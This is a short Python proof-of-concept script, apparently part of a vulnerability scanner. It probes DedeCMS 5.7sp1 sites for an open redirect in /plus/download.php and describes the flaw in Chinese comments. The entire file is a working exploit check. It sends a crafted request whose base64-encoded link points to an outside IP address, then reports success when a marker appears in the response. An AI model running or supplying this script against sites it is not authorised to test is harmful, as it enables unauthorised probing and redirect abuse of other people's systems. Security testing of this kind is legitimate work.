#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms download.php重定向漏洞
referer: http://skyhome.cn/dedecms/357.html
author: Lucifer
description: 在dedecms 5.7sp1的/plus/download.php中67行存在的代码，即接收参数后未进行域名的判断就进行了跳转。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class dedecms_download_redirect:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/download.php?open=1&link=aHR0cDovLzQ1Ljc2LjE1OC45MS9zc3Jm"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"100e8a82eea1ef8416e585433fd8462e" in req.text:
                printGreen("[+]Success:存在dedecms download.php重定向漏洞...(低危)\tpayload: "+vulnurl)

            else:
                printBlue("[-]Info:不存在dedecms_download_redirect漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = dedecms_download_redirect(sys.argv[1])
    testVuln.run()
